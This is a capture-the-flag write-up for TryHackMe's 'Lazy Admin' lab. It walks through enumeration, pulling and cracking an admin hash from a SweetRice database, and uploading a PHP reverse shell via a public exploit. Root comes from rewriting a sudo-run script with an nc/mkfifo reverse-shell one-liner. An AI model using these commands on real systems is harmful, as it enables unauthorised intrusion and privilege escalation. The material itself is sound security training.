# **Lazy Admin— TryHackMe — CTF Writeup**

# 5 days ago

![][image1]

Hello everyone\! This is a beginner-friendly room from the TryHackMe platform titled “Lazy Admin.”

This room is classified as easy and is a walkthrough-type challenge. It took me around 20 minutes to complete, and I hope this write-up helps guide you through the process\!

My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image2]

Let’s start with basic service detection and directory brute-forcing:

***nmap 10.10.61.218 — open***

***![][image3]***

Open ports:

* 22 (SSH)  
* 80 (HTTP)

Now let’s enumerate web directories

***feroxbuster \-u http://10.10.61.218/ \-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt***

***![][image4]***

Discovered:

* /content  
* /content/images

![][image5]

We visit /content and recognize the **SweetRice CMS** UI.

![][image6]

Sweet\!

Now time to dig into it :

![][image7]

***ffuf \-w /usr/share/dirb/wordlists/common.txt \-u http://10.10.61.218/content/FUZZ***

Findings:

![][image8]

* /inc directory has a SQLite DB file

Download and inspect:

***wget http://10.10.61.218/content/inc/config.db***

Open it in Mousepad or any SQLite browser. Use Ctrl+F to find credentials.

Found this in the DB:

![][image9]

admin\\”;s:7:\\”manager\\”;s:6:\\”passwd\\”;s:32:\\”42f749ade7f9e195bf475f37a44cafcb

The Hash type is : MD5

![][image10]

Crack it on [crackstation.net](https://crackstation.net/) → Password123

Credentials:

* **Username**: manager  
* **Password**: Password123

Now time to use reverse shell :

![][image11]

To send it as a php5 file we rename it:

***mv php-reverse-shell.php php-reverse-shell.php5***

Search for known exploit:

![][image12]

***searchsploit sweetrice***

we use:

***SweetRice 1.5.1 — Arbitrary File Upload — php/webapps/40716.py***

Copy and run it:

***searchsploit \-m php/webapps/40716.py***  
***python3 40716.py***

Enter the following when prompted:

* URL: [http://10.10.61.218/content/](http://10.10.61.218/content/)  
* User: manager  
* Pass: Password123  
* Shell file: php-reverse-shell.php5

In a new terminal, opening listner:

![][image13]

***nc \-lvnp 1234***

Now trigger the shell by visiting:

***http://10.10.61.218/content/attachment/php-reverse-shell.php5***

BOOM\! — We have the shell

Now :

![][image14]

***python3 \-c ‘import pty; pty.spawn(“/bin/bash”)’***

**Breakdown:**

* Used to upgrade a limited shell to a fully interactive TTY, enabling all features  
* python3 \-c: Runs Python code passed as a string.  
* import pty: Loads the pty module (used for pseudo-terminals).  
* pty.spawn("/bin/bash"): Spawns a fully interactive Bash shell.

Next searching for the user flag:

![][image15]

***cd /home***  
***cat user.txt***

Now escalating the privileges:

***sudo \-l***

Output:

**(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl**

Check the contents:

![][image16]

**cat /home/itguy/backup.pl**

Output:

**\#\!/usr/bin/perl**  
**system(“sh”, “/etc/copy.sh”);**

Then:

**cat /etc/copy.sh**

It already has a reverse shell format. Replace with your own IP:

***echo ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh \-i 2\>&1|nc 10.x.x.xxx 5554 \>/tmp/f’ \> /etc/copy.sh***

Now settign up the listner:

![][image17]

***nc \-lvnp 5554***

Now run the Perl script:

![][image18]

***sudo /usr/bin/perl /home/itguy/backup.pl***

BOOM\! we are root

![][image19]

***cd /root***  
***cat root.txt***
